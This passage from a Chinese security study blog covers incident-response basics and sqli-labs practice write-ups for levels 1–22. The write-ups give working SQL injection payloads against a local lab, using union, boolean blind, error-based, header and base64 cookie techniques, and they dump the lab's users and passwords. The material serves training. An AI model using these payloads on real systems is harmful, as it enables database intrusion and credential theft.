的左对齐。</li></ul></li><li><p>%f</p><p>：浮点数格式，可以使用以下对齐参数：</p><ul><li><code>%f</code>：默认对齐方式，右对齐。</li><li><code>%10f</code>：指定宽度为 10 的右对齐。</li><li><code>%-10f</code>：指定宽度为 10 的左对齐。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> GO语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB安全应急</title>
      <link href="/2024/08/30/WEB%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5/"/>
      <url>/2024/08/30/WEB%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>俗话说，知己知彼百战不殆。想要进行防守，就要先了解</p><h3 id="web攻击的流程："><a href="#web攻击的流程：" class="headerlink" title="web攻击的流程："></a><strong>web攻击的流程</strong>：</h3><p>1、信息收集<br>2、漏洞扫描<br>3、渗透攻击（植入webshell）<br>4、提权、挂黑链<br>5、后渗透攻击<br>6、持续控制</p><p>*具体可以看我发的另一篇文章：[<a href="https://bbs.kanxue.com/thread-282984.htm">分享]记一次cms的web渗透测试练习-WEB安全-看雪-安全社区|安全招聘|kanxue.com</a></p><h3 id="WEB入侵主要途径："><a href="#WEB入侵主要途径：" class="headerlink" title="WEB入侵主要途径："></a>WEB入侵主要途径：</h3><ul><li>通过web脚本或框架的漏洞获取webshell</li><li>通过获取cms的后台账号密码并登录</li><li>通过数据库开放的端口作为入口，爆破或猜解</li><li>通过web脚本或框架漏洞获取敏感权限或数据</li></ul><h3 id="web应急响应流程"><a href="#web应急响应流程" class="headerlink" title="web应急响应流程"></a>web应急响应流程</h3><p>1、确认攻击类型</p><p>2、异常信息收集</p><p>3、排查黑链</p><p>4、排查webshell：发现黑链或者暗链跳转等被篡改现象</p><p>5、分析web日志：发现webshell等</p><p>6、事件总结</p><h3 id="webshell的应急处置"><a href="#webshell的应急处置" class="headerlink" title="webshell的应急处置"></a>webshell的应急处置</h3><p>​webshell是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。<br>​黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。</p><h4 id="查杀工具："><a href="#查杀工具：" class="headerlink" title="查杀工具："></a>查杀工具：</h4><p>D盾、安全狗···</p><h4 id="webshell的确认与查杀方式："><a href="#webshell的确认与查杀方式：" class="headerlink" title="webshell的确认与查杀方式："></a>webshell的确认与查杀方式：</h4><ol><li>使用工具扫描</li><li>确认文件属性（创建时间、修改时间等）</li><li>查看文件特征（静态特征、动态特征）</li><li>进行文件对比</li><li>善用搜索引擎</li></ol><h3 id="黑链："><a href="#黑链：" class="headerlink" title="黑链："></a>黑链：</h3><p>通俗的讲，黑链就是构造的一个看不见摸得着的链接</p><p>使用站长之家和微步在线检测黑链</p><p>在搜索时前面加上 site:</p><p>使用文本工具删除黑链部分</p><h3 id="WEB日志"><a href="#WEB日志" class="headerlink" title="WEB日志"></a>WEB日志</h3><h4 id="位置："><a href="#位置：" class="headerlink" title="位置："></a>位置：</h4><ul><li><p>apache：</p><p>Windows: &lt;Apache安装目录&gt;&#x2F;logs&#x2F;access.log<br>Linux:  &#x2F;usr&#x2F;local&#x2F;apache&#x2F;logs&#x2F;access_log<br>若默认位置不存在，可通过&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf配置来判断。</p></li><li><p>Tomcat：</p></li></ul><p>​Tomcat默认不开启日志，可通过&lt;tomcat安装目录&gt;&#x2F;conf&#x2F;server.xml配置来判断Tomcat日志位置，一般情况下tomcat日志位于安装目录下的logs文件夹。</p><ul><li>IIS：</li></ul><p>​由于不同的 Windows 版本，iis日志路径不一样，所以分别介绍如下：<br>Windows Server 2003 iis6日志路径：C:\Windows\System32\LogFiles<br>Windows Server 2008 R2、2012、2016、2019 iis7以上日志路径：C:\inetpub\logs\LogFiles</p><ul><li>Nginx：</li></ul><p>​Linux: &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;log&#x2F;access.log<br>若默认位置不存在,可通过&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf配置来判断。</p><h4 id="日志分析过程："><a href="#日志分析过程：" class="headerlink" title="日志分析过程："></a>日志分析过程：</h4><ol><li>确认恶意文件特征</li><li>日志分析</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">寻找切入点：</span><br><span class="line">1.时间，webshell：</span><br><span class="line">缓存中的后门（记录的时间）</span><br><span class="line">webshell后门（后门的时间，不同时间段内后门的数量）</span><br><span class="line">黑链（黑链的时间，不同时间段内黑链的数量）</span><br><span class="line">后渗透工具（上传时间）</span><br><span class="line">......</span><br><span class="line">2.以攻击特征，访问频率：</span><br><span class="line">攻击特征明显的ip</span><br><span class="line">访问404较多的ip</span><br></pre></td></tr></table></figure><ol><li>可疑ip和特征过滤</li><li>确定攻击手段</li><li>确认攻击者</li><li>攻击过程还原</li></ol>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>应急响应基础</title>
      <link href="/2024/08/30/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
      <url>/2024/08/30/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>今天来复习应急响应</p><hr><p>​首先，应急响应有两种，一种是事前预防，一种是事后补救。一般来说，后者的情况会更普遍一些。也就是在被攻击后，使业务恢复正常的一种措施。</p><h2 id="网络安全事件"><a href="#网络安全事件" class="headerlink" title="网络安全事件"></a>网络安全事件</h2><h4 id="一、恶意程序事件"><a href="#一、恶意程序事件" class="headerlink" title="一、恶意程序事件"></a>一、恶意程序事件</h4><p>计算机病毒事件，蠕虫事件，特洛伊木马事件，僵尸网络事件，混合攻击程序事件，网页内嵌恶意代码事件，其他有害程序事件</p><h4 id="二、网络攻击事件"><a href="#二、网络攻击事件" class="headerlink" title="二、网络攻击事件"></a>二、网络攻击事件</h4><p>拒绝服务器攻击事件，后门攻击事件，漏洞攻击事件，网络扫描窃听事件，网络钓鱼事件，干扰事件，其他网络攻击事件</p><h4 id="三、信息破坏事件"><a href="#三、信息破坏事件" class="headerlink" title="三、信息破坏事件"></a>三、信息破坏事件</h4><p>信息篡改事件，信息假冒事件，信息泄露事件，信息窃取事件，信息丢失事件，其他信息破坏事件</p><h4 id="四、信息内容安全事件"><a href="#四、信息内容安全事件" class="headerlink" title="四、信息内容安全事件"></a>四、信息内容安全事件</h4><p>违反宪法和法律，行政法规的信息安全事件、针对社会事项进行讨论评论形成网上敏感的舆论热点，出现一定规模炒作的信息安全事件、组织串联，煽动集会游行的信息安全事件、其他信息内容安全事件</p><h4 id="五、设备设施故障"><a href="#五、设备设施故障" class="headerlink" title="五、设备设施故障"></a>五、设备设施故障</h4><p>软硬件自身故障、外围保障设施故障、人为破坏事故、其他设备设施故障</p><h4 id="六、灾害性事件"><a href="#六、灾害性事件" class="headerlink" title="六、灾害性事件"></a>六、灾害性事件</h4><h4 id="七、其他信息安全事件"><a href="#七、其他信息安全事件" class="headerlink" title="七、其他信息安全事件"></a>七、其他信息安全事件</h4><h2 id="网络攻击事件"><a href="#网络攻击事件" class="headerlink" title="网络攻击事件"></a>网络攻击事件</h2><h4 id="安全扫描器攻击："><a href="#安全扫描器攻击：" class="headerlink" title="安全扫描器攻击："></a>安全扫描器攻击：</h4><p>黑客利用扫描器对目标进行漏洞探测，并在发现漏洞后进一步利用漏洞攻击</p><h4 id="WEB漏洞攻击："><a href="#WEB漏洞攻击：" class="headerlink" title="WEB漏洞攻击："></a>WEB漏洞攻击：</h4><p>通过SQL注入漏洞、上传漏洞、XSS漏洞、越权访问漏洞等各种WEB漏洞进行攻击</p><h4 id="系统漏洞攻击："><a href="#系统漏洞攻击：" class="headerlink" title="系统漏洞攻击："></a>系统漏洞攻击：</h4><p>利用操作系统&#x2F;应用系统中存在漏洞进行攻击</p><h4 id="暴力破解攻击："><a href="#暴力破解攻击：" class="headerlink" title="暴力破解攻击："></a>暴力破解攻击：</h4><p>对目标系统账号密码进行暴力破解，获取后台管理员权限</p><h2 id="WEB恶意代码事件"><a href="#WEB恶意代码事件" class="headerlink" title="WEB恶意代码事件"></a>WEB恶意代码事件</h2><p>Webshell后门：黑客通过Webshell控制主机<br>网页挂马：页面被植入恶意内容，影响访问者安全<br>网页暗链：网站被植入博彩、色情、游戏等广告内容</p><h2 id="拒绝服务事件"><a href="#拒绝服务事件" class="headerlink" title="拒绝服务事件"></a>拒绝服务事件</h2><p>通过大流量DDOS或者CC攻击目标，使目标服务器无法提供正常服务</p><h2 id="恶意程序事件"><a href="#恶意程序事件" class="headerlink" title="恶意程序事件"></a>恶意程序事件</h2><p>病毒&#x2F;蠕虫：造成系统缓慢，数据损坏、运行异常<br>远控木马：主机被黑客远程控制<br>僵尸网络程序：主机对外发动DDOS攻击、对外发起扫描攻击行为<br>挖矿程序：造成系统资源大量消耗</p><h2 id="应急响应PDCERF模型"><a href="#应急响应PDCERF模型" class="headerlink" title="应急响应PDCERF模型"></a>应急响应PDCERF模型</h2><p>准备、检测、抑制、根除、恢复、跟踪</p><h2 id="SCERT安全事件处理流程"><a href="#SCERT安全事件处理流程" class="headerlink" title="SCERT安全事件处理流程"></a>SCERT安全事件处理流程</h2><h3 id="事件确认"><a href="#事件确认" class="headerlink" title="事件确认"></a>事件确认</h3><p>负责人对接客户，了解具体安全事件详情并记录问题情况</p><p>登录发生安全事件系统查看实际状态</p><p>根据客户描述现象与系统实际现象，对事件进行确认，定性</p><h3 id="事件抑制"><a href="#事件抑制" class="headerlink" title="事件抑制"></a>事件抑制</h3><p>断开网络连接</p><p>关闭特定的业务连接</p><p>关闭操作系统</p><h3 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理"></a>事件处理</h3><p>清除系统中存在木马、病毒、恶意代码程序</p><p>清理web站点中存在的木马、暗链、挂马页面</p><p>恢复被黑客篡改的系统配置，删除黑客创建的后门账号</p><p>删除异常系统服务，清理异常进程</p><p>恢复正常业务服务</p><h3 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h3><p>从网络流量、系统日志、WEB日志记录、应用日志、数据库日志、安全产品数据等，分析黑客入侵手法，调查造成安全事件的原因，确定安全事件的威胁和破坏的严重程度</p><h3 id="提交报告"><a href="#提交报告" class="headerlink" title="提交报告"></a>提交报告</h3><p>描述整个安全事件的现象、处理过程，处理结果、事件原因分析，并给出相应的安全建议</p><h3 id="结束跟踪"><a href="#结束跟踪" class="headerlink" title="结束跟踪"></a>结束跟踪</h3><p>在安全事件处理结束后，将继续跟踪事件处理结果，确认客户对安全事件处理的结果质量进行审查</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL实战2(sql_labs)</title>
      <link href="/2024/08/28/SQL%E5%AE%9E%E6%88%982/"/>
      <url>/2024/08/28/SQL%E5%AE%9E%E6%88%982/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>嗯，追了两天的综艺，昨天家里线路除了点小问题，只好去商场蹭空调避暑。走着走着就去了网吧，打了一会无畏契约，然后，就没有然后了，继续练习吧！</p><hr><h3 id="level-17"><a href="#level-17" class="headerlink" title="level 17"></a>level 17</h3><p>根据题目[PASSWORD RESET] 得知进入的是密码重置页面，用户名为Dhakkan</p><p>查看校验函数源码：在用户名调用了这个函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// truncation (see comments)</span></span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">get_magic_quotes_gpc</span>())</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Quote if not a number</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$value</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中:</p><ul><li><p>substr：截取0到15</p></li><li><p>stripslashes: 删除由 <a href="https://www.w3school.com.cn/php/func_string_addslashes.asp">addslashes()</a> 函数添加的反斜杠。</p></li></ul><p>使用报错注入：<strong>extractvalue()报错注入</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (extractvalue(1,concat(0x5c,database(),0x5c)))#</span><br></pre></td></tr></table></figure><h3 id="level-18"><a href="#level-18" class="headerlink" title="level 18:"></a>level 18:</h3><p>题目中出现了IP：Your IP ADDRESS is: 192.168.225.1和用户名Dhakkan</p><p>检查源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line"><span class="variable">$passwd</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>发现对用户框和密码框都做了校验，只能先用上关的账号密码登录进去试试了</p><p>返回了UA</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your User Agent is: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) <span class="title function_ invoke__">VALUES</span> (<span class="string">&#x27;$uagent&#x27;</span>, <span class="string">&#x27;$IP&#x27;</span>, <span class="variable">$uname</span>)</span><br></pre></td></tr></table></figure><p>抓个包改UA，根据源码构造payload（替换$uagent）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;,2,updatexml(1,concat(0x7e,database(),0x7e),1))#</span><br></pre></td></tr></table></figure><h3 id="level-19"><a href="#level-19" class="headerlink" title="level 19:"></a>level 19:</h3><p>看起来跟18关差不多~先登录</p><p>返回了referer：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your Referer is: http://192.168.225.132/sqli-labs/Less-19/</span><br></pre></td></tr></table></figure><p>对referer进行注入</p><h3 id="level-20"><a href="#level-20" class="headerlink" title="level 20:"></a>level 20:</h3><p>登录进去返回：</p><p><a href="/SQLpic/image-20240829143325276.png">图片</a></p><p>看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//寻找注入点</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="comment">//在cookie:uname</span></span><br><span class="line"><span class="variable">$cookee</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br></pre></td></tr></table></figure><h3 id="level-21："><a href="#level-21：" class="headerlink" title="level 21："></a>level 21：</h3><p>登陆进去发现跟刚刚相比，cookie做了编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YOUR COOKIE : uname = ZGhha2thbg</span><br></pre></td></tr></table></figure><p>把注入语句做一下编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MScpIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxkYXRhYmFzZSgpLDB4N2UpLDEpIw==</span><br></pre></td></tr></table></figure><h3 id="level-22"><a href="#level-22" class="headerlink" title="level 22:"></a>level 22:</h3><p>跟21关大同小异，改了一下闭合就出来了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MSIgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLGRhdGFiYXNlKCksMHg3ZSksMSkj</span><br></pre></td></tr></table></figure><hr><p>这个题目真是看的我心力交瘁，现在就先练习这么多吧，将来有时间再更新。</p><p>下面的计划是复习一下应急响应跟等保、风评这些概念性的东西</p><p>浏览了一下招聘软件，感觉现在越来越卷了，可能后面还得学点自动化、逆向之类的东西</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL实战1（sqli_labs）</title>
      <link href="/2024/08/26/SQL%E5%AE%9E%E6%88%98/"/>
      <url>/2024/08/26/SQL%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>因为之前练习DVWA和皮卡丘比较多，故这次选择了sqli_labs进行练习，由于题目数量众多，这里大部分只概括一下题目的特点。<br>再一个插图片我还不太熟练（目前只能以链接的形式插入），所以图片数量并不会很多</p><p>关于靶场就不再赘述了，开搞！</p><h3 id="level1："><a href="#level1：" class="headerlink" title="level1："></a>level1：</h3><p>1、判断漏洞类型：（字符型）</p><p><a href="/SQLpic/image-20240826150118411.png">图片</a></p><p><a href="/SQLpic/image-20240826150221383.png">图片</a></p><p><a href="/SQLpic/image-20240826150236748.png">图片</a></p><p>2、order by判断字段总数为3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.225.132/sqli-labs/Less-1/?id=1&#x27; order by 4--+</span><br></pre></td></tr></table></figure><p><a href="/SQLpic/image-20240826150355436.png">图片</a></p><p>3、开始union联合注入（图片略）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.225.132/sqli-labs/Less-1/?id=-1&#x27; union select 1,2,3--+</span><br><span class="line">Result:2,3</span><br><span class="line"></span><br><span class="line">http://192.168.225.132/sqli-labs/Less-1/?id=-1&#x27; union select 1,database(),3--+</span><br><span class="line">Result:security</span><br><span class="line"></span><br><span class="line">http://192.168.225.132/sqli-labs/Less-1/?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+</span><br><span class="line">Result:emails,referers,uagents,users</span><br><span class="line"></span><br><span class="line">http://192.168.225.132/sqli-labs/Less-1/?id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line">Result:user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,level,id,username,password</span><br><span class="line"></span><br><span class="line">http://192.168.225.132/sqli-labs/Less-1/?id=-1&#x27; union select 1,group_concat(username),group_concat(password) from users--+</span><br><span class="line">Result:Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4</span><br><span class="line">Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</span><br></pre></td></tr></table></figure><p>ok!第一关就完成了。</p><p>（把他写在这里主要是复习一下最基础的步骤）</p><h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><p>数字型</p><h3 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h3><p>根据返回的提示，修改闭合</p><p>提示：You have an error  in your SQL syntax; check the manual that corresponds to your MySQL  server version for the right syntax to use near ‘order by 3– ‘) LIMIT  0,1’ at line 1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.225.132/sqli-labs/Less-3/?id=1&#x27;) order by 3--+</span><br></pre></td></tr></table></figure><h3 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h3><p>闭合为双引号+括号（根据标题，此处也引申出当数字型和单引号均不成立时也可以试试其他闭合）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.225.132/sqli-labs/Less-4/?id=1&quot;) and 1=1--+</span><br></pre></td></tr></table></figure><h3 id="level-5-这里是网上查的-盲注还不太熟悉"><a href="#level-5-这里是网上查的-盲注还不太熟悉" class="headerlink" title="level 5 (这里是网上查的,盲注还不太熟悉)"></a>level 5 (这里是网上查的,<strong>盲注</strong>还不太熟悉)</h3><h4 id="布尔型盲注"><a href="#布尔型盲注" class="headerlink" title="布尔型盲注"></a>布尔型盲注</h4><p>​根据页面结果得知是字符型但是和前面四关还是不一样是因为页面虽然有东西。但是只有对于请求对错出现不一样页面其余的就没有了。这个时候我们用联合注入就没有用，因为联合注入是需要页面有回显位。如果数据 不显示只有对错页面显示我们可以选择<strong>布尔盲注</strong>。布尔盲注主要用到length(),ascii() ,substr()这三个函数，首先通过length()函数确定长度再通过另外两个确定具体字符是什么。布尔盲注向对于联合注入来说需要花费大量时间。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.225</span><span class="number">.132</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;and length((select database()))&gt;7--+</span></span><br><span class="line"><span class="string">#Result:8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1&#x27;</span><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> database()),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span><span class="comment">--+</span></span><br><span class="line">逐一判断数据库名</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13--+</span></span><br><span class="line"><span class="string">判断所有表名字符长度。</span></span><br><span class="line"><span class="string">?id=1&#x27;</span><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">99</span><span class="comment">--+</span></span><br><span class="line">逐一判断表名</span><br><span class="line"> </span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="string">&#x27;))&gt;20--+</span></span><br><span class="line"><span class="string">判断所有字段名的长度</span></span><br><span class="line"><span class="string">?id=1&#x27;</span><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">99</span><span class="comment">--+</span></span><br><span class="line">逐一判断字段名。</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length((select group_concat(username,password) from users))&gt;109--+</span></span><br><span class="line"><span class="string">判断字段内容长度</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> group_concat(username,password) <span class="keyword">from</span> users),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">50</span><span class="comment">--+</span></span><br><span class="line">逐一检测内容。</span><br></pre></td></tr></table></figure><p>​ok总结一些，这关是布尔型盲注，其中核心思路是：</p><ul><li><p>判断数据库名的长度</p></li><li><p>根据substr()函数逐一判断数据库的名字</p></li><li><p>判断所有表名的长度</p></li><li><p>逐一判断表名</p></li><li><p>判断所有字段名的长度</p></li><li><p>逐一判断字段名</p></li><li><p>判断字段内容长度</p></li><li><p>逐一判断字段内容</p><p>就是先看看多长，再逐一试出内容~</p><p>这里面用到的重要函数：</p></li><li><p>length()：获取当前数据库名的长度</p></li><li><p>ascii()：将截取的字符转换成对应的ascii吗，这样我们可以很好确定数字根据数字找到对应的字符。</p></li><li><p>substr(a,b,c)：a是要截取的字符串，b是截取的位置，c是截取的长度。布尔盲注我们都是长度为1因为我们要一个个判断字符</p></li></ul><h3 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h3><p>双引号</p><h3 id="level-7（上网查的，闭合是-单引号-两个反括号）"><a href="#level-7（上网查的，闭合是-单引号-两个反括号）" class="headerlink" title="level 7（上网查的，闭合是 单引号+两个反括号）"></a>level 7（上网查的，闭合是 单引号+两个反括号）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.225.132/sqli-labs/Less-7/?id=1&#x27;)) and 1=1 --+</span><br></pre></td></tr></table></figure><h3 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h3><p>同level 5</p><h3 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h3><h4 id="时间型盲注"><a href="#时间型盲注" class="headerlink" 